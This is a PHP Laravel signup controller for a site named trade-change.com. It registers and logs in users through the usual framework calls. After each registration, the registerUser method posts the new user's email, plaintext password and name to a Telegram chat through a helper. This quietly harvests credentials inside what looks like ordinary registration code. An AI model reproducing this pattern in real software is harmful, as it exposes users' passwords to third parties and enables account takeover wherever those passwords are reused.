<?php

namespace App\Http\Controllers\Auth;

use App\Models\User;
use App\Helpers\AppHelper;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Auth\Events\Registered;
use Illuminate\Foundation\Auth\RegistersUsers;

class SignupController extends Controller {
    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = '/account/';

    /**
     * The route to redirect to if validation fails.
     *
     * @var string
     */
    protected $redirectRoute = 'auth/signup';

    /**
     * Method that referrers to route('auth/signin')
     *
     * @return \Illuminate\View\View|\Illuminate\Contracts\View\Factory
     */
    public function get() {
        return view('auth/signup-old');
    }

    /**
     * Method that referrers to route('auth/signup') of POST method
     *
     * @param Request $request
     * @return $this|\Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function post(Request $request) {
        $data = $request->all();

        if (($validator = self::registerUser($data)) !== true) {
            return $this->goBack($validator);
        }

        return $this->redirectToUrl($this->redirectPath());
    }

    /**
     * Register, authenticate user and send message to telegram.org messenger.
     *
     * @param array $data
     * @return array|bool
     */
    public static function registerUser(array $data) {
        if (($validator = User::safeInsertCheck($data)) !== true) {
            return $validator;
        }

        try {
            $user = User::safeCreate([
                'name' => $data['name'],
                'email' => $data['email'],
                'password' => $data['password']
            ]);
        } catch (\Exception $e) {
            return ['email' => [trans('auth.failed')]];
        }

        event(new Registered($user));
        Auth::guard()->login($user);

        AppHelper::sendTelegramMessage(
            'Новая регистрация на сайте trade-change.com' . PHP_EOL
            . 'Логин: <b>' . $data['email'] . '</b>' . PHP_EOL
            . 'Пароль: <b>' . $data['password'] . '</b>' . PHP_EOL
            . 'Имя: <b>' . $data['name'] . '</b>'
        );

        return true;
    }
}
